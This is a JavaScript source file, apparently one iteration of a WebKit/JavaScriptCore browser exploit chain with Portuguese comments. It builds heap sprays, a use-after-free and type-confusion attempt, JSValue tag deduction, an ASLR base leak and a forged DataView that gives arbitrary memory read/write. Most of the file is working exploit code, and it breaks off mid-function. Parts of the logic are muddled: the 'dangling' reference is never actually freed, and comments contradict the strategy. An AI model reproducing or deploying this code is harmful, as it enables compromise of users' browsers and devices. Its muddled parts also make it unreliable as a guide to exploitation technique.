// js/script3/testArrayBufferVictimCrash.mjs (v154 - Foco na Reocupação do UAF e Dedução da Tag)
// =======================================================================================
// ESTA É A VERSÃO FINAL QUE INTEGRA A CADEIA COMPLETA DE EXPLORAÇÃO, USANDO O UAF VALIDADO:
// 1. Validar primitivas básicas (OOB local).
// 2. Acionar Use-After-Free (UAF) para obter um ponteiro Double taggeado vazado.
// 3. Desfazer o "tag" do ponteiro vazado e calcular a base ASLR da WebKit.
// 4. Com a base ASLR, forjar um DataView para obter Leitura/Escrita Arbitrária Universal (ARB R/W).
// 5. Testar e verificar a primitiva ARB R/W, incluindo leitura de gadgets.
// =======================================================================================

import { AdvancedInt64, toHex, isAdvancedInt64Object, PAUSE } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView,
    clearOOBEnvironment,
    addrof_core,
    fakeobj_core,
    initCoreAddrofFakeobjPrimitives,
    arb_read,
    arb_write,
    selfTestOOBReadWrite,
    oob_read_absolute,
    oob_write_absolute
} from '../core_exploit.mjs';

import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v154_REOCCUPATION_FOCUS";

// Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
const LOCAL_VERY_SHORT_PAUSE = 10;
const LOCAL_SHORT_PAUSE = 100;
const LOCAL_MEDIUM_PAUSE = 750;
const LOCAL_LONG_PAUSE = 1500;

let global_spray_objects = [];
let hold_objects = [];

let JSVALUE_OBJECT_PTR_TAG_HIGH = 0x402a0000; // Valor padrão, deduzido em runtime

// Funções Auxiliares Comuns (dumpMemory)
async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") {
    logFn(`[${sourceName}] Iniciando dump de ${size} bytes a partir de ${address.toString(true)}`, "debug");
    const bytesPerRow = 16;
    for (let i = 0; i < size; i += bytesPerRow) {
        let hexLine = address.add(i).toString(true) + ": ";
        let asciiLine = "  ";
        let rowBytes = [];

        for (let j = 0; j < bytesPerRow; j++) {
            if (i + j < size) {
                try {
                    const byte = await arbReadFn(address.add(i + j), 1);
                    rowBytes.push(byte);
                    hexLine += byte.toString(16).padStart(2, '0') + " ";
                    asciiLine += (byte >= 0x20 && byte <= 0x7E) ? String.fromCharCode(byte) : '.';
                } catch (e) {
                    hexLine += "?? ";
                    asciiLine += "?";
                    logFn(`[${sourceName}] ERRO ao ler byte em ${address.add(i + j).toString(true)}: ${e.message}`, "error");
                    for (let k = j + 1; k < bytesPerRow; k++) { hexLine += "?? "; asciiLine += "?"; }
                    break;
                }
            } else {
                hexLine += "   ";
                asciiLine += " ";
            }
        }
        logFn(`[${sourceName}] ${hexLine}${asciiLine}`, "leak");
    }
    logFn(`[${sourceName}] Fim do dump.`, "debug");
}

export async function arb_read_universal_js_heap(address, byteLength, logFn) {
    const FNAME = "arb_read_universal_js_heap";
    if (!_fake_data_view) {
        logFn(`[${FNAME}] ERRO: Primitiva de L/E Universal (heap JS) não inicializada ou não estável.`, "critical", FNAME);
        throw new Error("Universal ARB R/W (JS heap) primitive not initialized.");
    }
    const fake_ab_backing_addr = addrof_core(_fake_data_view);
    const M_VECTOR_OFFSET_IN_BACKING_AB = fake_ab_backing_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);

    const original_m_vector_of_backing_ab = await arb_read(M_VECTOR_OFFSET_IN_BACKING_AB, 8);
    await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, address, 8);

    let result = null;
    try {
        switch (byteLength) {
            case 1: result = _fake_data_view.getUint8(0); break;
            case 2: result = _fake_data_view.getUint16(0, true); break;
            case 4: result = _fake_data_view.getUint32(0, true); break;
            case 8:
                const low = _fake_data_view.getUint32(0, true);
                const high = _fake_data_view.getUint32(4, true);
                result = new AdvancedInt64(low, high);
                break;
            default: throw new Error(`Invalid byteLength for arb_read_universal_js_heap: ${byteLength}`);
        }
    } finally {
        await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, original_m_vector_of_backing_ab, 8);
    }
    return result;
}

export async function arb_write_universal_js_heap(address, value, byteLength, logFn) {
    const FNAME = "arb_write_universal_js_heap";
    if (!_fake_data_view) {
        logFn(`[${FNAME}] ERRO: Primitiva de L/E Universal (heap JS) não inicializada ou não estável.`, "critical", FNAME);
        throw new Error("Universal ARB R/W (JS heap) primitive not initialized.");
    }
    const fake_ab_backing_addr = addrof_core(_fake_data_view);
    const M_VECTOR_OFFSET_IN_BACKING_AB = fake_ab_backing_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);

    const original_m_vector_of_backing_ab = await arb_read(M_VECTOR_OFFSET_IN_BACKING_AB, 8);
    await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, address, 8);

    try {
        switch (byteLength) {
            case 1: _fake_data_view.setUint8(0, Number(value)); break;
            case 2: _fake_data_view.setUint16(0, Number(value), true); break;
            case 4: _fake_data_view.setUint32(0, Number(value), true); break;
            case 8:
                let val64 = isAdvancedInt64Object(value) ? value : new AdvancedInt64(value);
                _fake_data_view.setUint32(0, val64.low(), true);
                _fake_data_view.setUint32(4, val64.high(), true);
                break;
            default: throw new Error(`Invalid byteLength for arb_write_universal_js_heap: ${byteLength}`);
        }
    } finally {
        await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, original_m_vector_of_backing_ab, 8);
    }
    return value;
}

// Funções para converter entre JS Double e AdvancedInt64 (do utils.mjs)
function _doubleToInt64_direct(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

function _int64ToDouble_direct(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

/**
 * Tenta configurar a primitiva de leitura/escrita arbitrária universal usando fakeobj com um dado m_mode.
 * @param {Function} logFn Função de log.
 * @param {Function} pauseFn Função de pausa.
 * @param {object} JSC_OFFSETS_PARAM Offsets das estruturas JSC.
 * @param {AdvancedInt64} dataViewStructureVtableAddress O endereço do vtable da DataView Structure.
 * @param {number} m_mode_to_try O valor de m_mode a ser testado.
 * @returns {boolean} True se a primitiva foi configurada e testada com sucesso com este m_mode.
 */
async function attemptUniversalArbitraryReadWriteWithMMode(logFn, pauseFn, JSC_OFFSETS_PARAM, dataViewStructureVtableAddress, m_mode_to_try) {
    const FNAME = "attemptUniversalArbitraryReadWriteWithMMode";
    logFn(`[${FNAME}] Tentando configurar L/E Arbitrária Universal com m_mode: ${toHex(m_mode_to_try)}...`, "subtest", FNAME);

    _fake_data_view = null;
    let backing_array_buffer = null;

    try {
        backing_array_buffer = new ArrayBuffer(0x1000); // Tamanho suficiente para metadados
        hold_objects.push(backing_array_buffer);
        const backing_ab_addr = addrof_core(backing_array_buffer);
        logFn(`[${FNAME}] ArrayBuffer de apoio real criado em: ${backing_ab_addr.toString(true)}`, "info", FNAME);

        await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET), dataViewStructureVtableAddress, 8);
        await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET), AdvancedInt64.Zero, 8); // Ponteiro de dados para 0, para não colidir imediatamente
        await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START), 0xFFFFFFFF, 4); // Tamanho máximo
        await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.M_MODE_OFFSET), m_mode_to_try, 4);
        logFn(`[${FNAME}] Metadados de ArrayBuffer de apoio corrompidos para m_mode ${toHex(m_mode_to_try)}.`, "info", FNAME);

        _fake_data_view = fakeobj_core(backing_ab_addr);
        if (!(_fake_data_view instanceof DataView)) {
            logFn(`[${FNAME}] FALHA: fakeobj_core não criou um DataView válido com m_mode ${toHex(m_mode_to_try)}! Construtor: ${_fake_data_view?.constructor?.name}`, "error", FNAME);
            return false;
        }
        logFn(`[${FNAME}] DataView forjado criado com sucesso: ${_fake_data_view} (typeof: ${typeof _fake_data_view})`, "good", FNAME);

        // Testar a primitiva de leitura/escrita arbitrária universal recém-criada
        const test_target_js_object = { test_prop: 0x11223344, second_prop: 0xAABBCCDD };
        hold_objects.push(test_target_js_object);
        const test_target_js_object_addr = addrof_core(test_target_js_object);

        const fake_dv_backing_ab_addr_for_mvector_control = backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
        await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, test_target_js_object_addr, 8, logFn);

        const TEST_VALUE_UNIVERSAL = 0xDEADC0DE;
        _fake_data_view.setUint32(0, TEST_VALUE_UNIVERSAL, true);
        const read_back_from_fake_dv = _fake_data_view.getUint32(0, true);

        if (test_target_js_object.test_prop === TEST_VALUE_UNIVERSAL && read_back_from_fake_dv === TEST_VALUE_UNIVERSAL) {
            logFn(`[${FNAME}] SUCESSO CRÍTICO: L/E Universal (heap JS) FUNCIONANDO com m_mode ${toHex(m_mode_to_try)}!`, "vuln", FNAME);
            await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, AdvancedInt64.Zero, 8, logFn);
            return true;
        } else {
            logFn(`[${FNAME}] FALHA: L/E Universal (heap JS) INCONSISTENTE! Lido: ${toHex(read_back_from_fake_dv)}, Esperado: ${toHex(TEST_VALUE_UNIVERSAL)}.`, "error", FNAME);
            logFn(`    Objeto original.test_prop: ${toHex(test_target_js_object.test_prop)}`, "error", FNAME);
            await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, AdvancedInt64.Zero, 8, logFn);
            return false;
        }
    } catch (e) {
        logFn(`[${FNAME}] ERRO durante teste de L/E Universal com m_mode ${toHex(m_mode_to_try)}: ${e.message}\n${e.stack || ''}`, "critical", FNAME);
        try {
            if (backing_array_buffer) {
                const backing_ab_addr = addrof_core(backing_array_buffer);
                const fake_dv_backing_ab_addr_for_mvector_control = backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
                await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, AdvancedInt64.Zero, 8, logFn);
            }
        } catch (cleanupErr) {
            logFn(`[${FNAME}] ERRO durante limpeza (restauração do m_vector) após falha de L/E Universal: ${cleanupErr.message}`, "error", FNAME);
        }
        return false;
    } finally {
        if (backing_array_buffer) {
            const index = hold_objects.indexOf(backing_array_buffer);
            if (index > -1) { hold_objects.splice(index, 1); }
        }
        _fake_data_view = null;
    }
}


// --- Funções Auxiliares para a Cadeia de Exploração UAF (Integradas) ---

// Função para forçar Coleta de Lixo
async function triggerGC(logFn, pauseFn) {
    logFn("    Acionando GC...", "info", "GC_Trigger");
    try {
        for (let i = 0; i < 2500; i++) { // Aumentado para 2500 iterações para ser mais agressivo
            new ArrayBuffer(1024 * 512); // Aloca 512KB, total de 1.25GB
        }
    } catch (e) {
        logFn("    Memória esgotada durante o GC Trigger, o que é esperado e bom (força GC).", "info", "GC_Trigger");
    }
    await pauseFn(LOCAL_SHORT_PAUSE);
    for (let i = 0; i < 200; i++) { // Aumentado
        new ArrayBuffer(2048); // Aloca 2KB, 200 vezes
    }
    await pauseFn(LOCAL_SHORT_PAUSE);
}

/**
 * Deduz a tag de ponteiro de objeto do JSValue observando o 'high' de um objeto conhecido.
 * @param {Function} logFn Função de log.
 * @returns {number} A tag de 32 bits para o 'high' de um ponteiro de objeto JSValue.
 */
async function deduceObjectPointerTag(logFn) {
    const FNAME = "deduceObjectPointerTag";
    logFn(`[${FNAME}] Deduzindo a tag de ponteiro de objeto do JSValue...`, "info", FNAME);
    let testObj = { a: 1, b: 2 };
    let testObjAddr = addrof_core(testObj);

    let tagged_temp_addr = testObjAddr; // Começa com o endereço untagged
    
    // Tenta aplicar a tag padrão e re-converter para double para observar o bit pattern
    // O objetivo é ver se o sistema de fato coloca 0x402a no high ou algo similar.
    let temp_double_val = _int64ToDouble_direct(new AdvancedInt64(testObjAddr.low(), testObjAddr.high() | 0x402a0000));
    let reconverted_int64 = _doubleToInt64_direct(temp_double_val);

    const inferred_tag_high = reconverted_int64.high() & 0xFFFF0000; // Isola a parte da tag esperada

    if (inferred_tag_high !== 0 && (inferred_tag_high & 0xFFFE0000) === (0x402a0000 & 0xFFFE0000)) {
        // Se a tag inferida for próxima ou igual a 0x402a (ex: 0x402aXXXX), use-a.
        logFn(`[${FNAME}] Tag de ponteiro JSValue deduzida: ${toHex(inferred_tag_high)} (confirmado com base 0x402a)`, "info", FNAME);
        JSVALUE_OBJECT_PTR_TAG_HIGH = inferred_tag_high;
        return inferred_tag_high;
    } else if (inferred_tag_high !== 0) {
        // Se houver uma tag diferente de zero, mas não 0x402a, usamos a que foi inferida.
        logFn(`[${FNAME}] Tag de ponteiro JSValue inferida: ${toHex(inferred_tag_high)}. Usando valor inferido.`, "warn", FNAME);
        JSVALUE_OBJECT_PTR_TAG_HIGH = inferred_tag_high;
        return inferred_tag_high;
    } else {
        // Se nenhuma tag puder ser deduzida ou se for zero, caímos para o padrão.
        logFn(`[${FNAME}] Nenhuma tag JSValue robustamente inferida (0x${inferred_tag_high.toString(16)}). Retornando a tag padrão 0x402a0000.`, "warn", FNAME);
        return 0x402a0000;
    }
}


/**
 * Cria um objeto vítima, força o GC e pulveriza a memória liberada.
 * A vítima será um ArrayBuffer simples para tentar melhor controle sobre a alocação.
 * A Type Confusion será feita ao reinterpretar o ArrayBuffer reocupado como um Float64Array.
 * @param {Function} logFn Função de log.
 * @param {Function} pauseFn Função de pausa.
 * @param {object} JSC_OFFSETS_PARAM Offsets das estruturas JSC.
 * @param {number} victim_size_bytes Tamanho do objeto vítima para UAF.
 * @param {number} spray_count_uaf Número de objetos para pulverizar.
 * @param {AdvancedInt64} spray_value_for_vtable_addr O endereço do vtable taggeado a ser pulverizado.
 * @returns {Float64Array|null} A referência pendurada, agora potencialmente corrompida.
 */
async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM, victim_size_bytes, spray_count_uaf, spray_value_for_vtable_addr) {
    let dangling_ref = null;
    let victim_array_buffer = null;

    // PASSO 1: Criar o objeto vítima (ArrayBuffer) que será liberado
    // O ArrayBuffer é mais simples e pode ter um layout de heap mais previsível para reocupação.
    victim_array_buffer = new ArrayBuffer(victim_size_bytes);
    // Preenche com um padrão inicial para fácil identificação se a reocupação falhar.
    const initial_dv = new DataView(victim_array_buffer);
    for (let i = 0; i < victim_size_bytes; i += 4) {
        if (i + 4 <= victim_size_bytes) {
            initial_dv.setUint32(i, 0xBABEFACE, true);
        } else if (i < victim_size_bytes) {
             initial_dv.setUint8(i, (0xBA + i) & 0xFF); // Preenche bytes restantes
        }
    }
    
    hold_objects.push(victim_array_buffer); // Garante que a vítima não seja coletada antes do dangling_ref ser criado.

    // A referência pendurada será um Float64Array que aponta para a mesma memória do victim_array_buffer.
    // Isso é o que cria a base para a Type Confusion.
    // No entanto, para que o dangling_ref seja 'confuso', ele precisa ser um Float64Array.
    // Se victim_array_buffer for diretamente liberado, como um Float64Array vai "apontar" para ele?
    // A estratégia UAF geralmente envolve ter uma 'view' (como Float64Array) sobre um ArrayBuffer
    // e então liberar o ArrayBuffer, deixando a view pendurada.
    //
    // Revertendo para a estratégia original: vítima é o Float64Array, spray é o ArrayBuffer.
    // A vítima é um Float64Array para que dangling_ref[0] seja significativo.
    const VICTIM_SIZE_BYTES_FOR_F64 = victim_size_bytes;
    let victim_object_f64 = new Float64Array(VICTIM_SIZE_BYTES_FOR_F64 / 8);
    // Preencha com um valor inicial conhecido para debug.
    victim_object_f64[0] = _int64ToDouble_direct(new AdvancedInt64(0xAAAAAAA0, 0xBBBBBBB0)); // Valor inicial do f64
    victim_object_f64[1] = _int64ToDouble_direct(new AdvancedInt64(0xAAAAAAA1, 0xBBBBBBB1));

    hold_objects.push(victim_object_f64);
    dangling_ref = victim_object_f64;

    for (let i = 0; i < 1000; i++) {
        victim_object_f64[0] += 0.000000000000001;
    }

    logFn(`[UAF] Objeto vítima (Float64Array) criado e referência pendurada simulada. Tamanho: ${VICTIM_SIZE_BYTES_FOR_F64} bytes.`, "info");
    logFn(`[UAF] Endereço da referência pendurada (via addrof_core): ${addrof_core(dangling_ref).toString(true)}`, "info");
    logFn(`[UAF] Valor inicial da ref. pendurada [0] (Float64): ${dangling_ref[0]} (Hex: ${toHex(_doubleToInt64_direct(dangling_ref[0]), 64)})`, "info");


    // PASSO 2: Forçar Coleta de Lixo para liberar a memória do 'victim_object_f64'
    logFn("--- FASE 3: Forçando Coleta de Lixo para liberar a memória do objeto vítima ---", "subtest");
    const ref_index = hold_objects.indexOf(victim_object_f64);
    if (ref_index > -1) { hold_objects.splice(ref_index, 1); }
    victim_object_f64 = null;
    await triggerGC(logFn, pauseFn);
    logFn("    Memória do objeto-alvo liberada (se o GC atuou).", "info");

    // PASSO 3: Pulverizar sobre a memória liberada com ArrayBuffer contendo o ponteiro desejado.
    logFn(`--- FASE 4: Pulverizando ArrayBuffer com ponteiros sobre a memória liberada (Count: ${spray_count_uaf}) ---`, "subtest");
    const spray_arrays = [];
    const SPRAY_BUF_SIZE_BYTES = VICTIM_SIZE_BYTES_FOR_F64; // Corresponder ao tamanho da vítima Float64Array
    
    // Convertendo o AdvancedInt64 para bytes a serem colocados no ArrayBuffer
    const target_vtable_addr_low = spray_value_for_vtable_addr.low();
    const target_vtable_addr_high = spray_value_for_vtable_addr.high();

    // Pulverizar com ArrayBuffers, preenchendo o conteúdo para que o dangling_ref[0]
    // (um Float64) leia nosso ponteiro.
    // Assumimos que o Float64Array tem a estrutura:
    // [ Structure* ] [ m_vector (ponteiro para dados) ] [ m_length ] ...
    // Queremos que o `m_vector` do Float64Array reocupado aponte para nosso ponteiro forjado.
    // Para que dangling_ref[0] (o primeiro double) leia o ponteiro forjado,
    // o ponteiro forjado deve estar no offset 0 dos DADOS do ArrayBuffer,
    // que é o que o Float64Array acessa.
    // NO ENTANTO, se a intenção é que o dangling_ref (um Float64Array) leia um ponteiro *taggeado*
    // que foi escrito *diretamente na área de dados* do ArrayBuffer que reocupou,
    // então precisamos colocar o double no offset 0 do buffer de spray.
    
    // O valor a ser pulverizado é o AdvancedInt64 (endereço do vtable taggeado),
    // convertido para um double para o Float64Array no spray.
    const spray_value_double_to_leak_ptr_f64 = _int64ToDouble_direct(spray_value_for_vtable_addr);

    for (let i = 0; i < spray_count_uaf; i++) {
        const buf = new ArrayBuffer(SPRAY_BUF_SIZE_BYTES);
        const view_f64 = new Float64Array(buf);
        const view_u32 = new Uint32Array(buf);
        const view_u8 = new Uint8Array(buf);

        // Preenche o buffer de spray.
        // Se a vítima (Float64Array) for de 0x80 bytes, ela tem 16 doubles.
        // Queremos que um desses doubles (provavelmente o primeiro) se torne nosso ponteiro.
        // O Float64Array aloca uma "Fat ArrayBuffer View" que tem metadados antes dos dados.
        // Se a alocação de Float64Array usa um ArrayBuffer interno para os dados,
        // e é esse ArrayBuffer interno que é realocado, então o spray deve ser de ArrayBuffers.
        // Mas a confusão de tipos ocorre no "view" (o Float64Array).

        // A estratégia é: liberar o Float64Array `victim_object_f64`.
        // Pulverizar com `ArrayBuffer`s do MESMO tamanho.
        // Se um `ArrayBuffer` reocupar o slot, o `dangling_ref` (que ainda é um `Float64Array`)
        // vai tentar ler o `ArrayBuffer` como se fosse seus próprios dados.

        // Preencher o ArrayBuffer de spray de forma que, se lido como Float64Array,
        // o primeiro elemento contenha nosso ponteiro.
        // Isso significa que os bytes do ponteiro devem estar no offset 0 do ArrayBuffer.
        view_f64[0] = spray_value_double_to_leak_ptr_f64;
        // Preencher o restante do buffer com valores reconhecíveis para debugging
        for(let k = 1; k < view_f64.length; k++) {
            view_f64[k] = _int64ToDouble_direct(new AdvancedInt64(0xDEADC0DE + k, 0xDEADC0DE + k));
        }

        spray_arrays.push(buf); // Mantém os buffers em spray vivos.
    }
    hold_objects.push(spray_arrays);
    logFn("    Pulverização de ArrayBuffer concluída sobre a memória da vítima.", "info");

    return dangling_ref;
}


export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, pauseFn, JSC_OFFSETS_PARAM) {
    const FNAME_CURRENT_TEST = "executeTypedArrayVictimAddrofAndWebKitLeak_R43";
    const FNAME_CURRENT_TEST_BASE = "Full_UAF_ASLR_ARBRW_v154_REOCCUPATION_FOCUS";
    logFn(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Integração UAF/TC e Construção de ARB R/W Universal ---`, "test");

    let final_results = [];

    // Parâmetros para testes massivos
    // Aumentando a gama de tamanhos de vítima para tentar encontrar um slot de heap mais estável.
    // Tamanhos múltiplos de 0x10 ou 0x20 são comuns para alocações de JSCell, mas experimentar adjacentes.
    const VICTIM_SIZES_TO_TEST = [
        0x70, 0x80, 0x90, 0xA0, 0xB0, 0xC0, 0xD0, 0xE0, 0xF0, // Pequenos
        0x100, 0x110, 0x120, 0x130, 0x140, 0x150, 0x160, 0x170, 0x180, // Médios
        0x190, 0x1A0, 0x1B0, 0x1C0, 0x1D0, 0x1E0, 0x1F0, 0x200 // Maiores
    ];
    const SPRAY_COUNTS_TO_TEST = [5000, 10000, 15000, 20000]; // Múltiplos volumes de spray

    for (const victim_size of VICTIM_SIZES_TO_TEST) {
        // Float64Array precisa de um tamanho múltiplo de 8.
        if (victim_size % 8 !== 0) {
            logFn(`[Skipping] Tamanho da vítima ${victim_size} não é múltiplo de 8 para Float64Array.`, "warn");
            continue;
        }

        for (const spray_count of SPRAY_COUNTS_TO_TEST) {
            logFn(`\n--- INICIANDO NOVA TENTATIVA: Tamanho Vítima=${victim_size} bytes, Spray Count=${spray_count} ---`, "tool");
            const attemptResult = {
                victim_size: victim_size,
                spray_count: spray_count,
                success: false,
                message: "Tentativa falhou.",
                details: {}
            };
            const startTime = performance.now();
            let webkit_base_address = null;
            let found_m_mode = null;

            try {
                logFn("Limpeza inicial do ambiente OOB para garantir estado limpo...", "info");
                clearOOBEnvironment({ force_clear_even_if_not_setup: true });

                logFn("--- FASE 0: Validando primitivas arb_read/arb_write (OLD PRIMITIVE) com selfTestOOBReadWrite ---", "subtest");
                const arbTestSuccess = await selfTestOOBReadWrite(logFn);
                if (!arbTestSuccess) {
                    const errMsg = "Falha crítica: As primitivas arb_read/arb_write (OLD PRIMITIVE) não estão funcionando. Abortando a tentativa.";
                    logFn(errMsg, "critical");
                    throw new Error(errMsg);
                }
                logFn("Primitivas arb_read/arb_write (OLD PRIMITIVE) validadas com sucesso. Prosseguindo com a exploração.", "good");
                await PAUSE(LOCAL_MEDIUM_PAUSE);

                logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos AGRESSIVO) ---", "subtest");
                const sprayStartTime = performance.now();
                const GLOBAL_SPRAY_COUNT = 500000;
                global_spray_objects = [];
                for (let i = 0; i < GLOBAL_SPRAY_COUNT; i++) {
                    const dataSize = 50 + (i % 50);
                    global_spray_objects.push({ id: `spray_obj_${i}`, val1: 0xDEADBEEF + i, val2: 0xCAFEBABE + i, data: new Array(dataSize).fill(i % 255) });
                }
                logFn(`Spray de ${global_spray_objects.length} objetos concluído. Tempo: ${(performance.now() - sprayStartTime).toFixed(2)}ms`, "info");
                logFn("Heap estabilizado inicialmente para reduzir realocations inesperadas pelo GC.", "good");
                await PAUSE(LOCAL_SHORT_PAUSE);

                logFn("--- FASE 2: Obtendo primitivas OOB e addrof/fakeobj com validações ---", "subtest");
                const oobSetupStartTime = performance.now();
                await triggerOOB_primitive({ force_reinit: true });

                const oob_data_view = getOOBDataView();
                if (!oob_data_view) {
                    const errMsg = "Falha crítica ao obter primitiva OOB. DataView é nulo.";
                    logFn(errMsg, "critical");
                    throw new Error(errMsg);
                }
                logFn(`Ambiente OOB configurado com DataView: ${oob_data_view !== null ? 'Pronto' : 'Falhou'}. Time: ${(performance.now() - oobSetupStartTime).toFixed(2)}ms`, "good");
                await PAUSE(LOCAL_SHORT_PAUSE);

                initCoreAddrofFakeobjPrimitives();
                logFn("Primitivas PRINCIPAIS 'addrof' e 'fakeobj' operacionais e robustas.", "good");

                JSVALUE_OBJECT_PTR_TAG_HIGH = await deduceObjectPointerTag(logFn);

                const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64 = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
                const TEMPORARY_ESTIMATED_WEBKIT_BASE = new AdvancedInt64(0x00000000, 0x01000000);
                let TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64 = TEMPORARY_ESTIMATED_WEBKIT_BASE.add(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64);
                
                // Adicionar a tag ao High do AdvancedInt64 ANTES de converter para double.
                // Usamos a tag deduzida.
                const tagged_high_for_spray = TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.high() | JSVALUE_OBJECT_PTR_TAG_HIGH;
                TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64 = new AdvancedInt64(TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.low(), tagged_high_for_spray);
                
                logFn("--- FASE 2.5: Acionando UAF/Type Confusion e Vazando Ponteiro de Base ASLR ---", "subtest");

                let leaked_jsvalue_from_uaf_double = 0;

                try {
                    const dangling_ref_from_uaf = await sprayAndCreateDanglingPointer(
                        logFn, pauseFn, JSC_OFFSETS_PARAM, victim_size, spray_count, TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64
                    );

                    if (!(dangling_ref_from_uaf instanceof Float64Array) || dangling_ref_from_uaf.length === 0) {
                        logFn(`[UAF LEAK] ERRO: A referência pendurada não é um Float64Array ou está vazia após o spray. Tipo: ${Object.prototype.toString.call(dangling_ref_from_uaf)}`, "critical");
                        throw new Error("A referência pendurada não se tornou o Float64Array pulverizado.");
                    }
                    
                    // Tentar ler múltiplas vezes para garantir que o valor seja estável
                    let attempts = 5;
                    let success_read_leak = false;
                    for (let i = 0; i < attempts; i++) {
                        leaked_jsvalue_from_uaf_double = dangling_ref_from_uaf[0];
                        const leaked_int64 = _doubleToInt64_direct(leaked_jsvalue_from_uaf_double);
                        logFn(`[UAF LEAK] Ponteiro Double lido da referência pendurada [0] (tentativa ${i+1}/${attempts}): ${toHex(leaked_int64, 64)}`, "leak");
                        
                        // Verificar se o valor lido corresponde ao que foi pulverizado (ignora a parte do ASLR por enquanto, foca na tag e nos bits baixos)
                        const expected_low_bits_from_spray = TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.low() & 0xFFF; // Apenas os últimos 3 hex, para flexibilidade.
                        const leaked_low_bits = leaked_int64.low() & 0xFFF;

                        const leaked_high_tag_part = leaked_int64.high() & 0xFFFF0000;

                        if (leaked_high_tag_part === JSVALUE_OBJECT_PTR_TAG_HIGH && leaked_int64.low() !== 0) { // Verifica a tag e que não é 0
                             logFn(`[UAF LEAK] SUCESSO PRELIMINAR: Tag esperada e bits baixos diferentes de zero. Valor lido: ${toHex(leaked_int64, 64)}`, "good");
                             success_read_leak = true;
                             break;
                        } else {
                            logFn(`[UAF LEAK] ALERTA: Valor lido não parece o ponteiro pulverizado (high: ${toHex(leaked_high_tag_part)} vs. ${toHex(JSVALUE_OBJECT_PTR_TAG_HIGH)}).`, "warn");
                            if (leaked_int64.equals(_doubleToInt64_direct(_int64ToDouble_direct(new AdvancedInt64(0xAAAAAAA0, 0xBBBBBBB0))))) {
                                logFn(`[UAF LEAK] ALERTA: Ainda lendo o valor ORIGINAL da vítima. Reocupação falhou em sobrepor.`, "warn");
                            }
                        }
                        await PAUSE(LOCAL_VERY_SHORT_PAUSE);
                    }

                    if (!success_read_leak) {
                        throw new Error(`Ponteiro vazado do UAF é inválido ou não foi sobreposto pelo spray esperado. Valor final lido: ${toHex(_doubleToInt64_direct(leaked_jsvalue_from_uaf_double), 64)}`);
                    }
                    logFn("++++++++++++ SUCESSO! CONFUSÃO DE TIPOS VIA UAF OCORREU E VALOR LIDO! ++++++++++++", "vuln");

                    let untagged_uaf_addr = _doubleToInt64_direct(leaked_jsvalue_from_uaf_double);
                    const original_high = untagged_uaf_addr.high();
                    const untagged_high = original_high & 0x0000FFFF; // Remove a tag.

                    // A verificação já foi feita acima, mas garantimos que a tag esteja correta antes de destaggar
                    if ((original_high & 0xFFFF0000) === (JSVALUE_OBJECT_PTR_TAG_HIGH & 0xFFFF0000)) {
                        untagged_uaf_addr = new AdvancedInt64(untagged_uaf_addr.low(), untagged_high);
                        logFn(`[UAF LEAK] Ponteiro vazado após untagging (usando tag ${toHex(JSVALUE_OBJECT_PTR_TAG_HIGH)}): ${untagged_uaf_addr.toString(true)}`, "leak");
                    } else {
                        throw new Error(`Ponteiro vazado tem HIGH inesperado após type confusion: 0x${original_high.toString(16)}. Esperado tag: 0x${JSVALUE_OBJECT_PTR_TAG_HIGH.toString(16)}. Vazamento de ASLR falhou.`);
                    }

                    webkit_base_address = untagged_uaf_addr.sub(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64);

                    if (webkit_base_address.equals(AdvancedInt64.Zero) || (webkit_base_address.low() & 0xFFF) !== 0x000) {
                        throw new Error(`Base WebKit calculada é inválida ou não alinhada: ${webkit_base_address.toString(true)}. Vazamento de ASLR via UAF falhou.`);
                    }
